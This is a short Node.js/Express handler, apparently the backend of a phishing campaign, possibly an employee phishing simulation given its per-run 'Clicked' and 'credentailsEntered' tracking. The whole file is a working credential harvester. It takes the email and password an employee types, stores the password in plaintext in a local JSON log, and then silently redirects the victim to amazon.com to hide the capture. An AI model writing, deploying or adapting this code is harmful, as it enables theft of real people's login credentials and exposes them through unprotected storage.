import fs from 'fs';
import path from 'path';

const __dirname = path.resolve();
const logsFile = path.join(__dirname, './creds_logs.json');

const getCreds = (req, res) => {
    const { EmployeeEmail, email, password } = req.body;

    if (!EmployeeEmail || !email || !password) {
        console.warn('⚠️ Incomplete credentials received.');
        return res.status(400).send('<h3>❌ Missing information. Please try again.</h3>');
    }

    let logs = [];

    try {
        if (fs.existsSync(logsFile)) {
            const raw = fs.readFileSync(logsFile, 'utf8');
            const jsonData = JSON.parse(raw);

            if (Array.isArray(jsonData)) {
                logs = jsonData;
            } else {
                console.warn('⚠️ Invalid logs format — resetting to []');
                logs = [];
            }
        } else {
            console.log('📁 creds_logs.json not found — creating new.');
        }
    } catch (err) {
        console.error('❌ Error reading logs:', err);
        logs = [];
    }

    // If no runs exist → create first run
    if (logs.length === 0) {
        logs.push([]);
    }

    // Work with latest run (last array)
    const latestRun = logs[logs.length - 1];

    const detailsObj = {
        employee_email: EmployeeEmail,
        typed_email: email,
        typed_password: password,
        timestamp: new Date().toISOString()
    };

    const index = latestRun.findIndex(entry => entry.email === EmployeeEmail);

    if (index >= 0) {
        latestRun[index].credentailsEntered = true;
        latestRun[index].details = detailsObj;
        console.log(`✅ Updated details for ${EmployeeEmail}`);
    } else {
        const newEntry = {
            email: EmployeeEmail,
            Clicked: true,
            credentailsEntered: true,
            details: detailsObj
        };
        latestRun.push(newEntry);
        console.log(`✅ Added new entry for ${EmployeeEmail}`);
    }

    // Save back to file
    try {
        fs.writeFileSync(logsFile, JSON.stringify(logs, null, 2), 'utf8');
        console.log('💾 Logs saved.');
    } catch (err) {
        console.error('❌ Error writing logs:', err);
    }

    res.send(`
        <html lang="en">
<head>
    <meta http-equiv="refresh" content="0; url=https://www.amazon.com" />
    <title>Redirecting to Amazon...</title>
</head>
<body>
    <p>If you are not redirected automatically, <a href="https://www.amazon.com">click here</a>.</p>
</body>
</html>
    `);
};

export default getCreds;
